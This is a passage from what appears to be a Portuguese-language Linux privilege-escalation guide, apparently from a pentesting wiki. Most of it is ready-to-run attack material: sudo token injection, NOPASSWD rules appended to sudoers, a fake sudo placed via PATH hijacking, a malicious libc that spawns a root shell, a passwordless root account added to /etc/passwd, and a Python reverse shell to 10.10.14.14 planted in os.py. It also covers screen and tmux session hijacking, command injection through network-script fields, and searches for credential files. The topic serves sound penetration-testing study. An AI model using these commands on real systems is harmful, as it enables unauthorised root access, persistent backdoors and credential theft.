- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 mins** (por padrão, essa é a duração do token do sudo que nos permite usar `sudo` sem introduzir nenhuma password)
- `cat /proc/sys/kernel/yama/ptrace_scope` é 0
- `gdb` está acessível (você pode fazer upload dele)

(Você pode ativar temporariamente `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` e definir `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token do sudo na sua sessão** (você não obterá automaticamente um root shell, faça `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **pertencente ao root com setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- O **terceiro exploit** (`exploit_v3.sh`) irá **criar um arquivo sudoers** que torna **os tokens do sudo eternos e permite que todos os usuários usem sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro da pasta, você pode usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um sudo token para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, você pode **obter privilégios sudo** sem precisar saber a senha fazendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Esses arquivos **por padrão só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você conseguir **ler** este arquivo, poderá **obter algumas informações interessantes**, e se conseguir **escrever** em qualquer arquivo, será capaz de **escalar privilégios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você consegue escrever, você pode abusar dessa permissão
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra forma de abusar dessas permissões:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Há algumas alternativas para o binário `sudo`, como o `doas` para OpenBSD, lembre-se de verificar sua configuração em `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se você sabe que um **usuário normalmente se conecta a uma máquina e usa `sudo`** para escalar privilégios e você obteve um shell dentro do contexto desse usuário, você pode **criar um novo executável do sudo** que executará seu código como root e depois o comando do usuário. Então, **modifique o $PATH** do contexto do usuário (por exemplo, adicionando o novo caminho em .bash_profile) para que, quando o usuário executar sudo, seu executável sudo seja executado.

Observe que, se o usuário usar um shell diferente (não bash), você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou executando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Normalmente, esse arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde **bibliotecas** vão ser **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema vai procurar bibliotecas dentro de `/usr/local/lib`**.

Se por algum motivo **um usuário tiver permissões de escrita** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta dentro do arquivo de configuração em `/etc/ld.so.conf.d/*.conf`, ele pode conseguir escalar privilégios.\
Veja **como explorar essa má configuração** na seguinte página:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a lib para `/var/tmp/flag15/`, ela será usada pelo programa neste local, conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Então, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities fornecem um **subconjunto dos privilégios de root disponíveis para um processo**. Isso, na prática, divide os privilégios de root em unidades menores e distintas. Cada uma dessas unidades pode então ser concedida independentemente a processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a seguinte página para **saber mais sobre capabilities e como abusar delas**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Em um diretório, o **bit de "execute"** implica que o usuário afetado pode usar "**cd**" para entrar na pasta.\
O bit de **"read"** implica que o usuário pode **listar** os **arquivos**, e o bit de **"write"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

Access Control Lists (ACLs) representam a camada secundária de permissões discricionárias, capazes de **sobrescrever as permissões tradicionais ugo/rwx**. Essas permissões melhoram o controle sobre o acesso a arquivos ou diretórios, permitindo ou negando direitos a usuários específicos que não são os proprietários nem fazem parte do grupo. Esse nível de **granularidade garante um gerenciamento de acesso mais preciso**. Mais detalhes podem ser encontrados [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dê** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenha** arquivos com ACLs específicas do sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL oculto em sudoers drop-ins

Uma configuração incorreta comum é um arquivo pertencente a root em `/etc/sudoers.d/` com modo `440` que ainda concede acesso de escrita a um usuário sem privilégios por meio de ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Se você vir algo como `user:alice:rw-`, o usuário pode adicionar uma regra sudo apesar dos bits de modo restritivos:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
This is a caminho de ACL persistence/privesc de alto impacto porque é fácil passar despercebido em revisões que usam apenas `ls -l`.

## Open shell sessions

Em **old versions** você pode **hijack** alguma sessão de **shell** de um usuário diferente (**root**).\
Nas **newest versions** você poderá **connect** apenas a sessões de screen do **seu próprio usuário**. No entanto, você pode encontrar **interesting information** dentro da sessão.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Anexar a uma sessão**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## sequestro de sessões tmux

Isso era um problema com **versões antigas do tmux**. Não consegui sequestrar uma sessão do tmux (v2.1) criada por root como um usuário sem privilégios.

**Listar sessões tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Anexar a uma sessão**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores interessantes de configuração de SSH

- **PasswordAuthentication:** Especifica se a autenticação por password é permitida. O padrão é `no`.
- **PubkeyAuthentication:** Especifica se a autenticação por public key é permitida. O padrão é `yes`.
- **PermitEmptyPasswords**: Quando a autenticação por password é permitida, especifica se o servidor permite login em contas com strings de password vazias. O padrão é `no`.

### Arquivos de controle de login

Estes arquivos influenciam quem pode fazer login e como:

- **`/etc/nologin`**: se presente, bloqueia logins de não-root e exibe sua mensagem.
- **`/etc/securetty`**: restringe onde root pode fazer login (allowlist de TTY).
- **`/etc/motd`**: banner pós-login (pode leak ambiente ou detalhes de manutenção).

### PermitRootLogin

Especifica se root pode fazer login usando ssh, o padrão é `no`. Valores possíveis:

- `yes`: root pode fazer login usando password e private key
- `without-password` or `prohibit-password`: root só pode fazer login com uma private key
- `forced-commands-only`: Root só pode fazer login usando private key e se as opções de commands forem especificadas
- `no` : no

### AuthorizedKeysFile

Especifica arquivos que contêm as public keys que podem ser usadas para autenticação de user. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar absolute paths** (começando em `/`) ou **relative paths do home do user**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indicará que, se você tentar fazer login com a chave **privada** do usuário "**testusername**", o ssh vai comparar a chave pública da sua chave com as localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding permite que você **use suas chaves SSH locais em vez de deixar chaves** (sem passphrases!) no seu servidor. Assim, você poderá **fazer jump** via ssh **para um host** e, de lá, **fazer jump para outro** host **usando** a **chave** localizada no seu **host inicial**.

Você precisa definir esta opção em `$HOME/.ssh.config` assim:
```
Host example.com
ForwardAgent yes
```
Notice que, se `Host` for `*`, toda vez que o usuário saltar para uma máquina diferente, esse host poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **substituir** estas **opções** e permitir ou negar esta configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento de ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é allow).

Se você descobrir que Forward Agent está configurado em um ambiente, leia a seguinte página, pois **talvez você consiga abusá-lo para escalar privilégios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, você pode escalar privilégios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se algum script de perfil estranho for encontrado, você deve verificá-lo em busca de **detalhes sensíveis**.

### Passwd/Shadow Files

Dependendo do OS, os arquivos `/etc/passwd` e `/etc/shadow` podem estar usando um nome diferente ou pode haver um backup. Portanto, é recomendado **encontrar todos eles** e **verificar se você consegue lê-los** para ver **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, você pode encontrar **password hashes** dentro do arquivo `/etc/passwd` (ou equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Adicione então o usuário `hacker` e adicione a senha gerada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Alternativamente, você pode usar as seguintes linhas para adicionar um usuário fictício sem uma senha.\
WARNING: você pode degradar a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: Em plataformas BSD, `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, e `/etc/shadow` também é renomeado para `/etc/spwd.db`.

Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, você pode escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modify o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então você pode modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Seu backdoor será executado na próxima vez que o tomcat for iniciado.

### Check Folders

Os seguintes diretórios podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler o último, mas tente)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Localização estranha/arquivos Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Arquivos modificados nos últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos de banco de dados Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Arquivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries em PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Arquivos Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Arquivos conhecidos contendo senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura por **vários arquivos possíveis que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), que é uma aplicação open source usada para recuperar muitas senhas armazenadas em um computador local para Windows, Linux & Mac.

### Logs

Se você puder ler logs, talvez consiga encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho for o log, mais interessante ele será (provavelmente).\
Além disso, alguns **audit logs** "ruins" configurados (backdoored?) podem permitir que você **registre senhas** dentro dos audit logs, como explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **ler logs, o grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será muito útil.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Você também deve verificar arquivos que contenham a palavra "**password**" no **nome** ou dentro do **conteúdo**, e também verificar IPs e emails dentro de logs, ou regexps de hashes.\
Não vou listar aqui como fazer tudo isso, mas, se estiver interessado, você pode conferir as últimas verificações que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) executa.

## Writable files

### Python library hijacking

Se você souber **de onde** um script Python vai ser executado e **puder escrever dentro** dessa pasta ou **modificar bibliotecas Python**, você pode modificar a biblioteca do OS e colocar uma backdoor nela (se você puder escrever onde o script Python vai ser executado, copie e cole a biblioteca os.py).

Para **colocar uma backdoor na biblioteca**, basta adicionar no final da biblioteca os.py a seguinte linha (troque IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploração do Logrotate

Uma vulnerabilidade no `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pais potencialmente obtenham privilégios elevados. Isso acontece porque o `logrotate`, frequentemente executado como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar as permissões não apenas em _/var/log_ mas também em qualquer diretório onde a rotação de logs seja aplicada.

> [!TIP]
> Essa vulnerabilidade afeta a versão `3.18.0` do `logrotate` e anteriores

Mais informações detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar essa vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Essa vulnerabilidade é muito semelhante à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** então, sempre que você descobrir que pode alterar logs, verifique quem está gerenciando esses logs e veja se é possível escalar privilégios substituindo os logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referência da vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** conseguir **alterar** um existente, então seu **sistema foi comprometido**.

Scripts de rede, _ifcg-eth0_ por exemplo, são usados para conexões de rede. Eles parecem exatamente arquivos .INI. No entanto, eles são \~carregados\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses scripts de rede não é tratado corretamente. Se você tiver **espaço em branco** no nome, o sistema tenta executar a parte depois do espaço em branco. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

O diretório `/etc/init.d` é a casa dos **scripts** do System V init (SysVinit), o **clássico sistema de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` de serviços. Eles podem ser executados diretamente ou por meio de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um **gerenciamento de serviços** mais novo introduzido pelo Ubuntu, usando arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, os scripts SysVinit ainda são utilizados junto com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.

**systemd** surge como um inicializador e gerenciador de serviços moderno, oferecendo recursos avançados como início de daemon sob demanda, gerenciamento de automount e snapshots do estado do sistema. Ele organiza os arquivos em `/usr/lib/systemd/` para pacotes de distribuição e `/etc/systemd/system/` para modificações do administrador, simplificando o processo de administração do sistema.

## Outros truques

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks normalmente fazem hook de uma syscall para expor funcionalidades privilegiadas do kernel a um manager em userspace. Uma autenticação fraca do manager (por exemplo, checks de assinatura baseados em ordem de FD ou esquemas de senha ruins) pode permitir que um app local se passe pelo manager e eleve para root em dispositivos já rooted. Saiba mais e veja os detalhes de exploração aqui:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

A service discovery baseada em regex no VMware Tools/Aria Operations pode extrair um caminho de binário a partir das command lines dos processos e executá-lo com -v sob um contexto privilegiado. Padrões permissivos (por exemplo, usando \S) podem corresponder a listeners montados pelo atacante em locais graváveis (por exemplo, /tmp/httpd), levando à execução como root (CWE-426 Untrusted Search Path).

Saiba mais e veja um padrão generalizado aplicável a outras stacks de discovery/monitoring aqui:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
